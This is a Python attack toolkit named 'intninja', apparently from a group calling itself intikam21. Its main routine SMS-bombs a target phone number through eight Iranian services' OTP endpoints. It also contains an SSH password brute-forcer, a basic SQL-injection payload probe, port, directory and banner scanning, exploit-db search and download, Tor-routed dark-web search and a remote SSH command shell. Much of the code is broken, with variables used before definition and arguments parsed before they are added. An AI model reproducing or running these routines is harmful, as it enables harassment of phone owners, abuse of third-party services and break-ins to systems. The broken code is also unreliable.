#!/usr/bin/python3
# -*- coding: utf-8 -*-
#-*-intikam21*Cyber&Teams/Groups(We Are İntikam21-_-)('there is no escape from intikam21 * :)'): *
#Unless you steal the code..
import argparse
import requests
from stem import Signal
from stem.control import Controller
import socket
from bs4 import BeautifulSoup
from configparser import ConfigParser
import os
import sys
import threading
import time
import random
from queue import Queue
from argparse import ArgumentParser
from urllib3 import PoolManager
from json import dumps
from time import sleep
from re import search
import requests
import paramiko

def ssh_connect(chost, cport, c_username, cpassword):
    # SSH istemcisini oluşturma
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Sunucuya bağlanma
        ssh_client.connect(chost, cport, c_username, c_password)
        print(f"Bağlantı başarılı! Host: {chost}, Kullanıcı: {c_username}")

        while True:
            # Kullanıcıdan komut alma
            command = input(f"{username}@{host} $ ")

            # Çıkış komutları kontrolü
            if command.lower() in ['exit', 'quit', 'back']:
                break

            # SSH üzerinden komut gönderme
            stdin, stdout, stderr = ssh_client.exec_command(command)

            # Komut çıktısını okuma ve ekrana yazdırma
            output = stdout.read().decode()
            error = stderr.read().decode()
            
            if output:
                print(output)
            if error:
                print(error, file=sys.stderr)

    except paramiko.AuthenticationException:
        print("Kimlik doğrulama hatası. Kullanıcı adı veya şifre yanlış.")
    except paramiko.SSHException as ssh_err:
        print(f"SSH hatası: {ssh_err}")
    except Exception as e:
        print(f"Hata: {e}")
    finally:
        # SSH bağlantısını kapatma
        ssh_client.close()
        
def imei_check(imei):
    url = f"https://imeicheck.com/imei-check/{imei}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            return f"Hata: {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"Hata: {str(e)}"
      
def send(cellphone):
    http = PoolManager()

    #1. Snapp [OK]
    http.request("post", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        headers={"Content-Type": "application/json"},
        body=dumps({"cellphone": f"+98{cellphone}"}).encode())

    #2. TAPSI [OK]
    http.request("post", "https://tap33.me/api/v2/user",
        headers={"Content-Type": "application/json"},
        body=dumps({"credential": {"phoneNumber": f"0{cellphone}", "role": "PASSENGER"}}).encode())

    #3. eCharGe [OK]
    http.request("post", "https://www.echarge.ir/m/login?length=19",
        headers={"Content-Type": "application/json"},
        body=dumps({"phoneNumber": f"0{cellphone}"}).encode())

    #4. Divar [OK]
    http.request("post", "https://api.divar.ir/v5/auth/authenticate",
        headers={"Content-Type": "application/json"},
        body=dumps({"phone": f"0{cellphone}"}).encode())

    #5. Alibaba [OK]
    http.request("post", "https://ws.alibaba.ir/api/v3/account/mobile/otp",
        headers={"Content-Type": "application/json"},
        body=dumps({"phoneNumber": f"0{cellphone}"}).encode())

    #6. Torob [OK]
    http.request("GET", "https://api.torob.com/a/phone/send-pin/?phone_number=" + cellphone)

    #7. DrDr [OK]
    http.request("post", "https://drdr.ir/api/registerEnrollment/verifyMobile",
        headers={"Content-Type": "application/json"},
        body=dumps({"phoneNumber": f"0{cellphone}", "userType": "PATIENT"}).encode())

    #8. Filmnet [OK]
    http.request("GET", "https://api-v2.filmnet.ir/access-token/users/98" + cellphone + "/otp")


def spam(args):
    if search(r"9\d{9}$", args.cellphone):
        for time in range(args.times):
            print(f"\rSending SMS {time+1}/{args.times}", end="")
            try:
                send(args.cellphone)
            except KeyboardInterrupt:
                exit()
            sleep(2)
        print("")
    else:
        print("error: invalid cellphone format, format: 9\d{9} e.g. 91234xxxxx")

def search_exploits(keyword):
    url = f"https://www.exploit-db.com/search?q={keyword}"
    response = requests.get(url)
    
    if response.status_code != 200:
        print(f"Failed to search for exploits. HTTP status code: {response.status_code}")
        return []

    soup = BeautifulSoup(response.text, 'html.parser')
    results = []
    for row in soup.find_all('tr')[1:]:  # Skip header row
        columns = row.find_all('td')
        if len(columns) > 1:
            exploit_id = columns[0].text.strip()
            description = columns[1].text.strip()
            results.append((exploit_id, description))
    return results

def download_exploit(exploit_id, output_file):
    url = f"https://www.exploit-db.com/download/{exploit_id}"
    response = requests.get(url)
    
    if response.status_code == 200:
        with open(output_file, 'wb') as file:
            file.write(response.content)
        print(f"Exploit {exploit_id} successfully downloaded to {output_file}")
    else:
        print(f"Failed to download exploit {exploit_id}. HTTP status code: {response.status_code}")

CONF_PATH = os.path.expanduser("~/.config/sublime")
CONF_FILE = os.path.join(CONF_PATH, "setup.cfg")
CONF_DEFAULTS = {"intninja": {"key": ""}}

def get_new_identity():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password=args.password)  # Tor config dosyasındaki şifre ile eşleşmeli
        controller.signal(Signal.NEWNYM)

def search_darkweb(query):
    proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    search_url = f"http://msydqstlz2kzerdg.onion/search?q={query}"  # Bu, dark web'deki DuckDuckGo'nun .onion adresidir
    response = requests.get(search_url, proxies=proxies)
    if response.status_code == 200:
        return response.text
    else:
        return f"Hata: {response.status_code}"

def port_scan(target_host, target_ports):
    try:
        target_ip = socket.gethostbyname(target_host)
    except socket.gaierror:
        print(f'Hedef "{target_host}" çözümlenemedi.')
        return []

    print(f'Tarama başlatılıyor: {target_host}')

    open_ports = []
    for port in target_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            open_ports.append(port)
            print(f'Port {port} açık')
        sock.close()

    return open_ports

def http_header_scan(target_url):
    try:
        response = requests.head(target_url, timeout=3)
        print(f'HTTP başlığı alındı: {response.headers}')
    except requests.exceptions.RequestException as e:
        print(f'Hata: {e}')

def sql_injection_scan(target_url):
    # Örnek SQL enjeksiyon taraması
    payload = "' OR '1'='1"
    try:
        response = requests.get(target_url + f"/search?query={payload}", timeout=5)
        if "error" in response.text:
            print("SQL enjeksiyonu bulundu.")
        else:
            print("SQL enjeksiyonu tespit edilemedi.")
    except requests.exceptions.RequestException as e:
        print(f'Hata: {e}')

def vulnerability_scan(target_url):
    # Temel güvenlik zafiyet taraması (örneğin XSS kontrolü)
    try:
        response = requests.get(target_url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        if forms:
            print('XSS açığı olabilir: Formlar bulundu.')
        else:
            print('XSS açığı bulunamadı.')
    except requests.exceptions.RequestException as e:
        print(f'Hata: {e}')

def brute_force_ssh(host, username, password_list):
    for password in password_list:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, 22))
        if result == 0:
            try:
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=username, password=password)
                print(f'Başarılı SSH girişi: {username}@{host} - {password}')
                client.close()
                return
            except paramiko.AuthenticationException:
                pass
            except ImportError:
                print('Paramiko modülü eksik. Lütfen yükleyin: pip install paramiko')
        sock.close()

def dir_scan(target_url, dir_list):
    for directory in dir_list:
        url = f"{target_url}/{directory}"
        try:
            response = requests.get(url, timeout=3)
            if response.status_code == 200:
                print(f'Bulunan dizin: {url}')
        except requests.exceptions.RequestException as e:
            pass

def banner_grab(target_host, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((target_host, target_port))
        sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
        banner = sock.recv(1024)
        print(f'Banner bilgisi: {banner.decode()}')
        sock.close()
    except socket.error as e:
        print(f'Hata: {e}')

def main():
    parser = argparse.ArgumentParser(description='intninja', prog='intninja',
        formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('query', nargs='?')
    parser.add_argument('-r', '--report', help='Email address to report',
                        action='store', dest='report', type=str, required=False)
    parser.add_argument('--tags', help='Tags that should be applied',
                        action='store', dest='tags', type=str, required=False)
    parser.add_argument('--description', help='Additional information and context',
                        action='store', dest='description', type=str, required=False)
    parser.add_argument('--timestamp', help=(
                        'When this activity occurred as a string, defaults to now(). '
                        'Example: "Sun Aug 18 22:51:32 EDT 2019" or "08/18/2019 22:51:32 EDT"'
                        ), action='store', dest='timestamp', type=str, required=False)
    parser.add_argument('--expires', help=(
                        'Number of hours the email should be considered risky'
                        ), action='store', dest='expires', type=int, required=False)
    parser.add_argument('--proxy', help=(
                        'Proxy to use for requests. Example: "socks5://10.10.10.10:8000"'
                        ), action='store', dest='proxy', type=str, required=False),

    parser.add_argument("meterpreter", help="meterpreter")
    parser.add_argument('target', help='Hedef IP veya URL', )
    parser.add_argument("-v", "--vulnerability-scanner", help='Vulnerability scan')
    parser.add_argument("-s", "--sql-injection", help='Sql injection Scan')
    parser.add_argument('-u', '--username', help='target mail for bruteforce')
    parser.add_argument("-ps", '--password-list', help='password list for bruteforce')
    parser.add_argument("-b", '--bruteforce-ssh', help='Bruteforce')
    parser.add_argument('--dirscan', action='store_true', help='Dir scanning')
    parser.add_argument('--banner', action='store_true', help='Banner Grabbing')
    parser.add_argument('-d', '--dir', help='dir for dirscan')
    parser.add_argument('-p', '--ports', nargs='+', type=int, default=[80, 443], 
                        help='Taranacak port numaraları (varsayılan: 80, 443)')
    parser.add_argument('--dark-web', type=str, required=False, help='Aranacak kelime veya ifade')
    parser.add_argument("--password", required=False, help="Your Passw from Darkweb")
    parser.add_argument('keyword', type=str, nargs='?', help='Keyword to search for exploits')
    parser.add_argument('-o', '--output', type=str, default='exploit.c', help='Output file name')
    parser.add_argument("cellphone", help="target cellphone: e.g. 91234xxxxx")
    parser.add_argument("--times", help="count of SMSs (per service!)", type=int, default=10)
    spam(parser.parse_args())
    parser.add_argument('imei', type=str, help='Sorgulanacak IMEI numarası')
    parser.add_argument('--chost', required=True, help='cmd address')
    parser.add_argument('--cport', type=int, default=22, help='SSH PORT (varsayılan: 22)')
    parser.add_argument('--c_username', required=True, help='SSH username')
    parser.add_argument('--cpassword', required=True, help='SSH password')
    if args.imei:
    	result = imei_check(args.imei)
    	print(result)
    if args.c_username and args.cport and args.cpassword and args.chost:
    	ssh_connect(args.chost, args.cport, args.c_username, args.c_password)

    args = parser.parse_args()
    
    def exploit():
        results = search_exploits(args.keyword)
        if not results:
            print("No exploits found.")
            return
        print("Exploits found:")
        for i, (exploit_id, description) in enumerate(results, start=1):
            print(f"{i}. ID: {exploit_id}, Description: {description}")
        exploit_id = input("Enter the ID of the exploit to download: ")
        download_exploit(exploit_id, args.output)

    if args.query:
        # Exploit arama ve indirme
        exploit()
    elif args.target:
        if args.vulnerability_scanner:
            vulnerability_scan(args.target)
        if args.sql_injection:
            sql_injection_scan(args.target)
        if args.bruteforce_ssh and args.username and args.password_list:
            with open(args.password_list) as file:
                passwords = file.read().splitlines()
            brute_force_ssh(args.target, args.username, passwords)
        if args.dirscan and args.dir:
            with open(args.dir) as file:
                dirs = file.read().splitlines()
            dir_scan(args.target, dirs)
        if args.banner:
            banner_grab(args.target, args.ports[0])  # İlk portu kullanarak banner bilgisi alınıyor
        if args.ports:
            port_scan(args.target, args.ports)
        if args.dark_web:
            response = search_darkweb(args.dark_web)
            print(response)
        if args.proxy:
            proxies = {'http': args.proxy, 'https': args.proxy}
            requests.get(args.target, proxies=proxies)
    else:
        if not args.report or not args.tags:
            print("Error: 'report' and 'tags' are required when no query is provided.")
            return

if __name__ == "__main__":
    main()